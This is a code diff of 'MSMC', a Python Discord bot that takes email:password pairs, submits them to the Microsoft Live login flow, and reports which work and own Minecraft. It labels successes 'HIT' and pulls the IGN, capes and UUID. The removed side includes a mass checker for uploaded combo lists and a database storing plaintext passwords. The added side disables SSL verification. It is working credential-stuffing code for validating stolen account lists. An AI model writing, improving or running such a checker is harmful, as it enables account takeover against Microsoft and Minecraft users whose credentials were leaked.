@@ -2,90 +2,68 @@ import discord
 from discord.ext import commands
 import requests
 import re
-import os
-import time
-import json
-import sqlite3
 import asyncio
-import io
+import io,os
 from datetime import datetime
 from urllib.parse import urlparse, parse_qs
-from dotenv import load_dotenv
-
-# Load environment variables
-load_dotenv()
 
 # Suppress SSL warnings
 import urllib3
 urllib3.disable_warnings()
 
 # ==================== CONFIGURATION ====================
-# Get token from environment variable or use hardcoded (for testing)
-TOKEN = os.getenv("TOKEN")  # Make sure your environment variable is named this
-if not TOKEN:
-    # Fallback to hardcoded for testing - REMOVE THIS IN PRODUCTION
-    TOKEN = "YOUR_BOT_TOKEN_HERE"  # Replace with your actual token if not using env
-
+TOKEN = os.getenv("TOKEN")  # Replace with your actual bot token
 PREFIX = "!"
 
-# Database setup
-conn = sqlite3.connect('msmc_bot.db')
-c = conn.cursor()
-c.execute('''CREATE TABLE IF NOT EXISTS checks
-             (user_id INTEGER, email TEXT, password TEXT, ign TEXT, 
-              status TEXT, timestamp TEXT, result TEXT)''')
-conn.commit()
-
-# ==================== AUTHENTICATION FUNCTIONS ====================
+# Microsoft login URLs
 sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
 
+# ==================== MICROSOFT ACCOUNT CHECK ====================
 def get_urlPost_sFTTag(session):
     """Extract login page tokens"""
-    max_retries = 3
-    for attempt in range(max_retries):
-        try:
-            text = session.get(sFTTag_url, timeout=15).text
-            
-            # Try different regex patterns for sFTTag
-            patterns = [
-                r'value=\\\"(.+?)\\\"',
-                r'value="(.+?)"',
-                r'name="PPFT"\s+value="(.+?)"'
+    try:
+        text = session.get(sFTTag_url, timeout=15).text
+        
+        # Extract sFTTag (the security token)
+        sFTTag = None
+        patterns = [
+            r'value="([^"]+)" name="PPFT"',
+            r'name="PPFT"\s+value="([^"]+)"',
+            r'value=\\\"(.+?)\\\"',
+            r'value="(.+?)"'
+        ]
+        
+        for pattern in patterns:
+            match = re.search(pattern, text, re.S)
+            if match:
+                sFTTag = match.group(1)
+                break
+        
+        if sFTTag:
+            # Extract urlPost
+            url_patterns = [
+                r'"urlPost":"(.+?)"',
+                r"urlPost:'(.+?)'",
+                r'action="([^"]+)"'
             ]
             
-            sFTTag = None
-            for pattern in patterns:
+            for pattern in url_patterns:
                 match = re.search(pattern, text, re.S)
                 if match:
-                    sFTTag = match.group(1)
-                    break
-            
-            if sFTTag:
-                # Extract urlPost
-                url_patterns = [
-                    r'"urlPost":"(.+?)"',
-                    r"urlPost:'(.+?)'",
-                    r'<form[^>]+action="([^"]+)"'
-                ]
-                
-                for pattern in url_patterns:
-                    match = re.search(pattern, text, re.S)
-                    if match:
-                        return match.group(1), sFTTag, session
-                        
-        except Exception as e:
-            print(f"Attempt {attempt + 1} failed: {e}")
-            time.sleep(1)
-    
-    return None, None, session
+                    return match.group(1), sFTTag, session
+        
+        return None, None, session
+    except Exception as e:
+        print(f"Error getting tokens: {e}")
+        return None, None, session
 
 def get_xbox_rps(session, email, password, urlPost, sFTTag):
     """Submit credentials and get RPS token"""
     try:
         data = {
-            'login': email, 
-            'loginfmt': email, 
-            'passwd': password, 
+            'login': email,
+            'loginfmt': email,
+            'passwd': password,
             'PPFT': sFTTag
         }
         
@@ -97,7 +75,7 @@ def get_xbox_rps(session, email, password, urlPost, sFTTag):
         login_request = session.post(urlPost, data=data, headers=headers, 
                                      allow_redirects=True, timeout=15)
         
-        # Check for success (access_token in fragment)
+        # Check for access_token in the URL fragment
         if '#' in login_request.url:
             fragment = urlparse(login_request.url).fragment
             token = parse_qs(fragment).get('access_token', ["None"])[0]
@@ -105,14 +83,25 @@ def get_xbox_rps(session, email, password, urlPost, sFTTag):
                 return token, session
         
         # Check for 2FA
-        if any(x in login_request.text.lower() for x in ['twofactor', '2fa', 'cancel?mkt=', 'recover?mkt']):
+        if any(x in login_request.text.lower() for x in ['twofactor', '2fa', 'cancel?mkt=', 'recover?mkt', 'proof']):
             return "2FA", session
         
         # Check for bad credentials
-        if any(x in login_request.text.lower() for x in ['password is incorrect', "account doesn't exist", 
-                                                         "that password is incorrect", "sign in to your microsoft"]):
+        error_indicators = [
+            'password is incorrect',
+            "account doesn't exist",
+            "that password is incorrect",
+            "sign in to your microsoft",
+            "we detected something unusual"
+        ]
+        
+        if any(x in login_request.text.lower() for x in error_indicators):
             return "BAD", session
         
+        # Sometimes it redirects to a different page
+        if 'login.live.com' in login_request.url and 'error' in login_request.url:
+            return "BAD", session
+            
         return "BAD", session
         
     except Exception as e:
@@ -126,11 +115,11 @@ def get_xsts_token(session, rps_token):
         xbl_login = session.post('https://user.auth.xboxlive.com/user/authenticate',
                                   json={
                                       "Properties": {
-                                          "AuthMethod": "RPS", 
+                                          "AuthMethod": "RPS",
                                           "SiteName": "user.auth.xboxlive.com",
                                           "RpsTicket": rps_token
                                       },
-                                      "RelyingParty": "http://auth.xboxlive.com", 
+                                      "RelyingParty": "http://auth.xboxlive.com",
                                       "TokenType": "JWT"
                                   },
                                   headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
@@ -150,10 +139,10 @@ def get_xsts_token(session, rps_token):
         xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize',
                             json={
                                 "Properties": {
-                                    "SandboxId": "RETAIL", 
+                                    "SandboxId": "RETAIL",
                                     "UserTokens": [xbl_token]
                                 },
-                                "RelyingParty": "rp://api.minecraftservices.com/", 
+                                "RelyingParty": "rp://api.minecraftservices.com/",
                                 "TokenType": "JWT"
                             },
                             headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
@@ -178,7 +167,7 @@ def get_minecraft_token(session, uhs, xsts_token):
     try:
         mc_login = session.post('https://api.minecraftservices.com/authentication/login_with_xbox',
                                 json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"},
-                                headers={'Content-Type': 'application/json'}, 
+                                headers={'Content-Type': 'application/json'},
                                 timeout=15)
         
         if mc_login.status_code == 200:
@@ -190,10 +179,10 @@ def get_minecraft_token(session, uhs, xsts_token):
         return None
 
 def get_minecraft_profile(session, mc_token):
-    """Retrieve Minecraft profile (IGN and capes)"""
+    """Retrieve Minecraft profile"""
     headers = {'Authorization': f'Bearer {mc_token}'}
     try:
-        resp = session.get('https://api.minecraftservices.com/minecraft/profile', 
+        resp = session.get('https://api.minecraftservices.com/minecraft/profile',
                           headers=headers, timeout=15)
         
         if resp.status_code == 200:
@@ -204,14 +193,16 @@ def get_minecraft_profile(session, mc_token):
             capes_str = ", ".join(cape_names) if cape_names else "None"
             uuid = data.get('id', 'N/A')
             return ign, capes_str, uuid
+        elif resp.status_code == 404:
+            return None, None, None
         return None, None, None
         
     except Exception as e:
         print(f"Profile error: {e}")
         return None, None, None
 
-def check_account(email, password):
-    """Main function to check a single account"""
+def check_microsoft_account(email, password):
+    """Complete account check function"""
     session = requests.Session()
     session.verify = False
     
@@ -219,27 +210,42 @@ def check_account(email, password):
         # Step 1: Get login page tokens
         urlPost, sFTTag, session = get_urlPost_sFTTag(session)
         if not urlPost or not sFTTag:
-            return {"status": "error", "message": "Failed to load login page"}
+            return {
+                "status": "error",
+                "message": "Could not load Microsoft login page"
+            }
         
-        # Step 2: Login and get RPS token
+        # Step 2: Login
         rps_token, session = get_xbox_rps(session, email, password, urlPost, sFTTag)
         
         if rps_token == "BAD":
-            return {"status": "bad", "message": "Invalid credentials"}
+            return {
+                "status": "bad",
+                "message": "❌ Invalid email or password"
+            }
         elif rps_token == "2FA":
-            return {"status": "2fa", "message": "2FA required - cannot automate"}
+            return {
+                "status": "2fa",
+                "message": "🔐 2FA Required - Cannot automate"
+            }
         
         # Step 3: Get XSTS token
         uhs, xsts_token = get_xsts_token(session, rps_token)
         if not uhs or not xsts_token:
-            return {"status": "error", "message": "XSTS authentication failed"}
+            return {
+                "status": "error",
+                "message": "Authentication failed"
+            }
         
         # Step 4: Get Minecraft token
         mc_token = get_minecraft_token(session, uhs, xsts_token)
         if not mc_token:
-            return {"status": "valid_mail", "message": "Valid Microsoft account, no Minecraft"}
+            return {
+                "status": "valid_mail",
+                "message": "📧 Valid Microsoft Account (No Minecraft)"
+            }
         
-        # Step 5: Get profile
+        # Step 5: Get Minecraft profile
         ign, capes, uuid = get_minecraft_profile(session, mc_token)
         if ign:
             return {
@@ -247,32 +253,38 @@ def check_account(email, password):
                 "ign": ign,
                 "capes": capes,
                 "uuid": uuid,
-                "message": f"✅ **HIT!**\nIGN: {ign}\nCapes: {capes}\nUUID: {uuid}"
+                "message": f"✅ **MINECRAFT ACCOUNT!**\nIGN: {ign}\nCapes: {capes}\nUUID: {uuid}"
             }
         else:
-            return {"status": "error", "message": "Profile fetch failed"}
+            return {
+                "status": "error",
+                "message": "Profile fetch failed"
+            }
             
     except Exception as e:
-        return {"status": "error", "message": str(e)}
+        return {
+            "status": "error",
+            "message": f"Error: {str(e)}"
+        }
     finally:
         session.close()
 
 # ==================== DISCORD BOT ====================
-# Remove default help command
 bot = commands.Bot(command_prefix=PREFIX, intents=discord.Intents.all(), help_command=None)
 
 @bot.event
 async def on_ready():
-    print(f'{bot.user} has connected to Discord!')
-    await bot.change_presence(activity=discord.Game(name=f"{PREFIX}help | Account Checker"))
+    print(f'✅ {bot.user} is online!')
+    print(f'📡 Connected to {len(bot.guilds)} servers')
+    await bot.change_presence(activity=discord.Game(name=f"{PREFIX}check | Account Checker"))
 
 @bot.command(name="check", aliases=["c"])
-async def check_single(ctx, credentials: str = None):
-    """Check a single Microsoft account"""
+async def check_cmd(ctx, *, credentials: str = None):
+    """Check a single Microsoft/Minecraft account"""
     if not credentials:
         embed = discord.Embed(
             title="❌ Invalid Usage",
-            description=f"Please use: `{PREFIX}check email:password`",
+            description=f"Please use: `{PREFIX}check email:password`\n\nExample: `{PREFIX}check test@gmail.com:password123`",
             color=discord.Color.red()
         )
         await ctx.send(embed=embed)
@@ -281,7 +293,7 @@ async def check_single(ctx, credentials: str = None):
     if ":" not in credentials:
         embed = discord.Embed(
             title="❌ Invalid Format",
-            description="Please use: `email:password`\nExample: `test@gmail.com:password123`",
+            description="Please use: `email:password`\n\nExample: `test@gmail.com:password123`",
             color=discord.Color.red()
         )
         await ctx.send(embed=embed)
@@ -290,222 +302,75 @@ async def check_single(ctx, credentials: str = None):
     email, password = credentials.split(":", 1)
     
     # Send initial message
-    msg = await ctx.send(f"🔍 Checking `{email}`...")
+    msg = await ctx.send(f"🔍 Checking `{email}`...\nThis may take 10-15 seconds...")
     
     # Run check in thread
-    def check_thread():
-        return check_account(email, password)
+    def check():
+        return check_microsoft_account(email, password)
     
-    result = await asyncio.get_event_loop().run_in_executor(None, check_thread)
+    result = await asyncio.get_event_loop().run_in_executor(None, check)
     
-    # Create embed based on result
+    # Create response embed
     embed = discord.Embed(title="Account Check Result", color=discord.Color.blue())
     embed.add_field(name="Email", value=email, inline=False)
     
     if result["status"] == "hit":
         embed.color = discord.Color.green()
-        embed.add_field(name="Status", value="✅ HIT - Minecraft Account", inline=True)
+        embed.add_field(name="Status", value="✅ MINECRAFT ACCOUNT", inline=True)
         embed.add_field(name="IGN", value=result["ign"], inline=True)
         embed.add_field(name="Capes", value=result["capes"], inline=False)
         embed.add_field(name="UUID", value=result["uuid"], inline=False)
         
-        # Save to database
-        c.execute("INSERT INTO checks VALUES (?, ?, ?, ?, ?, ?, ?)",
-                  (ctx.author.id, email, password, result["ign"], "hit", 
-                   datetime.now().isoformat(), json.dumps(result)))
-        conn.commit()
-        
     elif result["status"] == "valid_mail":
         embed.color = discord.Color.gold()
-        embed.add_field(name="Status", value="📧 Valid Microsoft Account (No Minecraft)", inline=True)
-        
-        c.execute("INSERT INTO checks VALUES (?, ?, ?, ?, ?, ?, ?)",
-                  (ctx.author.id, email, password, "N/A", "valid_mail",
-                   datetime.now().isoformat(), json.dumps(result)))
-        conn.commit()
+        embed.add_field(name="Status", value="📧 VALID MICROSOFT ACCOUNT", inline=True)
+        embed.add_field(name="Note", value="No Minecraft license found", inline=False)
         
     elif result["status"] == "2fa":
         embed.color = discord.Color.orange()
-        embed.add_field(name="Status", value="🔐 2FA Required", inline=True)
-        embed.add_field(name="Note", value="This account requires two-factor authentication", inline=False)
+        embed.add_field(name="Status", value="🔐 2FA REQUIRED", inline=True)
+        embed.add_field(name="Note", value="This account has two-factor authentication enabled", inline=False)
         
     elif result["status"] == "bad":
         embed.color = discord.Color.red()
-        embed.add_field(name="Status", value="❌ BAD - Invalid Credentials", inline=True)
+        embed.add_field(name="Status", value="❌ INVALID CREDENTIALS", inline=True)
+        embed.add_field(name="Note", value="Email or password is incorrect", inline=False)
         
     else:
         embed.color = discord.Color.red()
-        embed.add_field(name="Status", value="⚠️ Error", inline=True)
+        embed.add_field(name="Status", value="⚠️ ERROR", inline=True)
         embed.add_field(name="Error", value=result["message"], inline=False)
     
     await msg.edit(content=None, embed=embed)
 
-@bot.command(name="masscheck", aliases=["mc"])
-async def mass_check(ctx):
-    """Mass check accounts from an uploaded file"""
-    if not ctx.message.attachments:
-        embed = discord.Embed(
-            title="❌ No File Uploaded",
-            description=f"Please upload a `.txt` file with credentials (one per line: email:password)",
-            color=discord.Color.red()
-        )
-        await ctx.send(embed=embed)
-        return
-    
-    attachment = ctx.message.attachments[0]
-    
-    if not attachment.filename.endswith('.txt'):
-        embed = discord.Embed(
-            title="❌ Invalid File Type",
-            description="Please upload a `.txt` file",
-            color=discord.Color.red()
-        )
-        await ctx.send(embed=embed)
-        return
-    
-    # Download and parse file
-    try:
-        file_content = await attachment.read()
-        lines = file_content.decode('utf-8').splitlines()
-    except:
-        embed = discord.Embed(
-            title="❌ File Read Error",
-            description="Could not read the file. Please ensure it's a valid text file.",
-            color=discord.Color.red()
-        )
-        await ctx.send(embed=embed)
-        return
-    
-    # Filter valid lines
-    combos = []
-    for line in lines:
-        line = line.strip()
-        if line and ':' in line:
-            combos.append(line)
-    
-    if not combos:
-        embed = discord.Embed(
-            title="❌ No Valid Credentials",
-            description="No valid `email:password` lines found in the file",
-            color=discord.Color.red()
-        )
-        await ctx.send(embed=embed)
-        return
-    
-    # Start checking
-    msg = await ctx.send(f"🔍 Starting mass check of {len(combos)} accounts...")
-    
-    results = {"hits": [], "valid_mail": [], "bad": [], "2fa": [], "errors": []}
-    
-    for i, combo in enumerate(combos, 1):
-        email, password = combo.split(":", 1)
-        
-        def check_thread():
-            return check_account(email, password)
-        
-        result = await asyncio.get_event_loop().run_in_executor(None, check_thread)
-        
-        if result["status"] == "hit":
-            results["hits"].append(f"{combo} | IGN: {result['ign']} | Capes: {result['capes']}")
-        elif result["status"] == "valid_mail":
-            results["valid_mail"].append(combo)
-        elif result["status"] == "2fa":
-            results["2fa"].append(combo)
-        elif result["status"] == "bad":
-            results["bad"].append(combo)
-        else:
-            results["errors"].append(combo)
-        
-        # Update progress every 10 accounts
-        if i % 10 == 0 or i == len(combos):
-            await msg.edit(content=f"🔍 Checking... {i}/{len(combos)} | Hits: {len(results['hits'])} | Valid: {len(results['valid_mail'])}")
-    
-    # Create result embed
-    embed = discord.Embed(title="📊 Mass Check Results", color=discord.Color.blue())
-    embed.add_field(name="Total", value=str(len(combos)), inline=True)
-    embed.add_field(name="✅ Hits", value=str(len(results["hits"])), inline=True)
-    embed.add_field(name="📧 Valid Mail", value=str(len(results["valid_mail"])), inline=True)
-    embed.add_field(name="🔐 2FA", value=str(len(results["2fa"])), inline=True)
-    embed.add_field(name="❌ Bad", value=str(len(results["bad"])), inline=True)
-    embed.add_field(name="⚠️ Errors", value=str(len(results["errors"])), inline=True)
-    
-    # Create results file
-    output_lines = []
-    if results["hits"]:
-        output_lines.append("=== HITS ===\n" + "\n".join(results["hits"]))
-    if results["valid_mail"]:
-        output_lines.append("\n=== VALID MICROSOFT ACCOUNTS (No Minecraft) ===\n" + "\n".join(results["valid_mail"]))
-    if results["2fa"]:
-        output_lines.append("\n=== 2FA REQUIRED ===\n" + "\n".join(results["2fa"]))
-    if results["bad"]:
-        output_lines.append("\n=== BAD CREDENTIALS ===\n" + "\n".join(results["bad"]))
-    
-    if output_lines:
-        file_content = "\n".join(output_lines)
-        file = discord.File(io.StringIO(file_content), filename="results.txt")
-        await ctx.send(embed=embed, file=file)
-    else:
-        await ctx.send(embed=embed)
-
-@bot.command(name="stats")
-async def stats(ctx):
-    """Show user's check statistics"""
-    c.execute("SELECT status, COUNT(*) FROM checks WHERE user_id = ? GROUP BY status", (ctx.author.id,))
-    results = c.fetchall()
-    
-    if not results:
-        embed = discord.Embed(
-            title="📊 Statistics",
-            description="You haven't checked any accounts yet!",
-            color=discord.Color.blue()
-        )
-        await ctx.send(embed=embed)
-        return
-    
-    embed = discord.Embed(title=f"📊 Statistics for {ctx.author.name}", color=discord.Color.blue())
-    
-    status_names = {
-        "hit": "✅ Hits",
-        "valid_mail": "📧 Valid Mail",
-        "bad": "❌ Bad",
-        "2fa": "🔐 2FA"
-    }
-    
-    total = 0
-    for status, count in results:
-        name = status_names.get(status, status)
-        embed.add_field(name=name, value=str(count), inline=True)
-        total += count
-    
-    embed.add_field(name="Total", value=str(total), inline=True)
-    embed.set_footer(text="Use !check to check more accounts!")
-    
+@bot.command(name="test")
+async def test(ctx):
+    """Test if bot is working"""
+    embed = discord.Embed(
+        title="✅ Bot is Working!",
+        description=f"Connected to Discord\nLatency: {round(bot.latency * 1000)}ms\nUsing Microsoft login API",
+        color=discord.Color.green()
+    )
     await ctx.send(embed=embed)
 
 @bot.command(name="commands", aliases=["help"])
-async def help_command(ctx):
-    """Show help message"""
+async def commands_cmd(ctx):
+    """Show all commands"""
     embed = discord.Embed(
-        title="🎮 MSMC Discord Bot - Minecraft Account Checker",
-        description="Check Microsoft accounts for Minecraft ownership",
-        color=discord.Color.green()
+        title="🤖 MSMC Discord Bot - Commands",
+        description="Microsoft/Minecraft Account Checker\nChecks if email:password is valid and has Minecraft",
+        color=discord.Color.blue()
     )
     
     embed.add_field(
         name=f"{PREFIX}check email:password",
-        value="Check a single account\nExample: `!check test@gmail.com:password123`",
+        value="Check a single Microsoft/Minecraft account\nExample: `!check test@gmail.com:pass123`",
         inline=False
     )
     
     embed.add_field(
-        name=f"{PREFIX}masscheck",
-        value="Check multiple accounts (upload a .txt file with one email:password per line)",
-        inline=False
-    )
-    
-    embed.add_field(
-        name=f"{PREFIX}stats",
-        value="Show your personal check statistics",
+        name=f"{PREFIX}test",
+        value="Check if bot is working",
         inline=False
     )
     
@@ -516,39 +381,20 @@ async def help_command(ctx):
     )
     
     embed.add_field(
-        name=f"{PREFIX}test",
-        value="Test if the bot is working",
+        name="What it checks",
+        value="✓ Valid Microsoft account\n✓ Minecraft ownership\n✓ IGN and UUID\n✓ Cape list",
         inline=False
     )
     
-    embed.set_footer(text="Made for Minecraft account checking | Results are saved in database")
-    
+    embed.set_footer(text="Made for Minecraft account checking")
     await ctx.send(embed=embed)
 
-@bot.command(name="test")
-async def test(ctx):
-    """Test if bot is working"""
-    embed = discord.Embed(
-        title="✅ Bot is Working!",
-        description=f"Use `{PREFIX}commands` for available commands",
-        color=discord.Color.green()
-    )
-    await ctx.send(embed=embed)
-
-# Error handling
 @bot.event
 async def on_command_error(ctx, error):
     if isinstance(error, commands.CommandNotFound):
         embed = discord.Embed(
             title="❌ Command Not Found",
-            description=f"Use `{PREFIX}commands` for available commands",
-            color=discord.Color.red()
-        )
-        await ctx.send(embed=embed)
-    elif isinstance(error, commands.MissingRequiredArgument):
-        embed = discord.Embed(
-            title="❌ Missing Argument",
-            description=f"Use `{PREFIX}commands` for correct usage",
+            description=f"Use `{PREFIX}commands` to see all commands",
             color=discord.Color.red()
         )
         await ctx.send(embed=embed)
@@ -559,25 +405,24 @@ async def on_command_error(ctx, error):
             color=discord.Color.red()
         )
         await ctx.send(embed=embed)
-        print(error)
+        print(f"Error: {error}")
 
 # ==================== RUN BOT ====================
 if __name__ == "__main__":
-    # Check for token
     if TOKEN == "YOUR_BOT_TOKEN_HERE":
-        print("="*50)
-        print("⚠️  DISCORD BOT TOKEN REQUIRED")
-        print("="*50)
-        print("\nTo set up your bot:")
+        print("\n" + "="*60)
+        print("⚠️  BOT TOKEN REQUIRED!")
+        print("="*60)
+        print("\nTo get your bot token:")
         print("1. Go to https://discord.com/developers/applications")
-        print("2. Click 'New Application' and give it a name")
-        print("3. Go to the 'Bot' section")
-        print("4. Click 'Add Bot' and then 'Reset Token'")
-        print("5. Copy the token and set it as environment variable DISCORD_BOT_TOKEN")
-        print("\nOr edit the TOKEN variable in the script")
-        print("="*50)
+        print("2. Create a new application")
+        print("3. Go to 'Bot' section")
+        print("4. Click 'Add Bot'")
+        print("5. Copy the token")
+        print("\nReplace 'YOUR_BOT_TOKEN_HERE' with your actual token")
+        print("="*60 + "\n")
         exit(1)
     
-    # Run the bot
     print("Starting MSMC Discord Bot...")
+    print("="*40)
     bot.run(TOKEN)
